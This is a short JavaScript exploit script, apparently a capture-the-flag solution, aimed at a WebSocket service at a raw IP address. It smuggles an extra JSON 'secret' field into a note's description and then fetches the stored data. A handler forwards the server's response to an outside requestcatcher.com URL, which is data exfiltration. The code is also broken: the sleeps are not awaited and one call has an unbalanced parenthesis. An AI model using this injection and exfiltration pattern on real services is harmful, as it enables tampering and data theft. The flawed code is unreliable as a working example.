function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const ws = new WebSocket(`ws://188.166.175.0:31972/ws`);

sleep(2000);

ws.send(JSON.stringify({ action: 'add', title:'lol', description:'dd","secret":"9a87e1e4e02c63957da05739d4dd3995","loo' }));

sleep(2000);

ws.send(JSON.stringify({ action: 'get'});
        
ws.onmessage = async (msg) => {
    const data = JSON.parse(msg.data);
    if(data.action === 'get'){
      fetch('https://kek.requestcatcher.com/?'+data);
    }
}


